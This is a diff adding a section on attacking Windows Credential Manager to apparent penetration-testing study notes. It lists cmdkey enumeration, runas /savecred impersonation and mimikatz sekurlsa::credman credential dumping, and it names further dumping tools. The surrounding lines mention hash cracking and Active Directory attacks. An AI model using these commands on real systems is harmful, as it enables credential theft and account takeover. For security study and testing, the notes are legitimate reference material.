@@ -300,6 +300,30 @@
     # we can take the NT hashes from these and crack with hashcat
     ```
 
+* Attacking Windows Credential Manager:
+
+  ```sh
+  # enumerate creds with cmdkey
+
+  cmdkey /list
+  # shows stored creds
+
+  # suppose we have a stored 'domain password' for a user
+
+  runas /savecred /user:SRV01\mcharles cmd
+  # to impersonate the stored user
+
+  # we can extract this using mimikatz
+  mimikatz.exe
+
+  privilege::debug
+
+  sekurlsa::credman
+  # dumps creds
+
+  # we can also use other tools like SharpDPAPI, LaZagne, and DonPAPI
+  ```
+
 * Attacking Active Directory & NTDS.dit:
 
   * dictionary attacks against AD accounts:
